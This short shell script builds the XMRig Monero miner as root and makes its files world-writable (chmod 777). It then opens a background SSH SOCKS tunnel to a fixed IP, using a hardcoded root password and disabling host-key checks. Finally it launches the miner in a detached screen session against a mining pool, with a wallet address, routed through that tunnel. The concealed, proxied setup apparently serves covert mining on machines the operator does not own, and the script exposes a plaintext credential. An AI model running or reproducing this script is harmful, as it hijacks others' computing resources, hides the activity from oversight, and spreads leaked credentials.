sudo -i
sudo apt-get update
sudo yes Y | sudo apt-get install git build-essential cmake automake libtool autoconf
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/scripts
./build_deps.sh && cd ../build
cmake .. -DXMRIG_DEPS=scripts/deps
make -j$(nproc)
sudo chmod 777 *
screen -d -m sshpass -p #6hR!N1,EU%%)Qs4 ssh -o StrictHostKeyChecking=no -D 1997 root@149.28.51.235
screen -d -m ./xmrig -o pool.minexmr.com:4444 -u 859HoAtW19PT8SmdjuMJ3DTqbZKFv8DFu7DYtk6wJm3YKrAJKTVeRDkZNq8fPseEz4D7KRBwkfGcHE73XKYYAhguEBH8w5X.test_03 -x socks4://127.0.0.1:1997
ls
